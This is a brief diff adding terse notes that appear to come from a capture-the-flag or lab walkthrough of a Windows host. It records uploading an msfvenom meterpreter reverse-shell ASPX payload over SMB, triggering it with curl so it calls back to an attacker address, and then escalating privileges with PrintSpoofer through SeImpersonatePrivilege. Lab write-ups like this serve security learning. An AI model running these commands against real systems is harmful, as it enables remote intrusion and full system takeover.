@@ -1,0 +1,12 @@
+we found port ports open and now we ee we can upload on smb
+
+so we uploaded ==aspx== file on smb and got shell by doing curl on
+
+```
+$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx
+$ curl http://10.10.11.52:49663/nt4wrksv/shell.aspx
+```
+
+==SetImpersonatePrivilage== --> ==PrintSpoofer64==.exe -i -c cmd
+
+to get shell a root
